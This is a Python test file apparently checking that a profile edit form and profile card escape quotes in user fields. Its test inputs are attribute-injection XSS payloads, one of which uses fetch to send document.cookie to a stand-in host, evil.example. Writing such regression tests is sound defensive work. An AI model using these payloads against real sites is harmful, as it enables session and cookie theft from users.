from html.parser import HTMLParser

from app.profiles import render_card, render_edit_form


class Tags(HTMLParser):
    """Collects every start tag with its attributes, the way a browser would read the page."""

    def __init__(self, html):
        super().__init__(convert_charrefs=True)
        self.tags = []
        self.feed(html)
        self.close()

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, dict(attrs)))

    def attrs_of(self, tag, **having):
        return next(attrs for name, attrs in self.tags
                    if name == tag and all(attrs.get(k) == v for k, v in having.items()))

    def attribute_names(self):
        return {name for _, attrs in self.tags for name in attrs}


FORM_ATTRIBUTES = {"method", "action", "type", "name", "value"}


def test_quote_in_a_form_value_stays_inside_the_value():
    name = 'Dana" autofocus onfocus="alert(document.cookie)'
    page = Tags(render_edit_form({"display_name": name, "job_title": "Engineer"}))
    assert page.attribute_names() <= FORM_ATTRIBUTES
    assert page.attrs_of("input", name="display_name")["value"] == name


def test_quote_in_the_job_title_adds_no_attribute():
    title = 'x" onmouseover="fetch(`//evil.example/?c=${document.cookie}`)" data-x="'
    page = Tags(render_edit_form({"display_name": "Dana", "job_title": title}))
    assert page.attribute_names() <= FORM_ATTRIBUTES
    assert page.attrs_of("input", name="job_title")["value"] == title


def test_quote_in_the_card_title_adds_no_attribute():
    name = 'Sam" onmouseover="alert(1)" class="card'
    page = Tags(render_card({"display_name": name, "role": "staff"}))
    assert page.attribute_names() <= {"class", "title"}
    assert page.attrs_of("div")["title"] == name
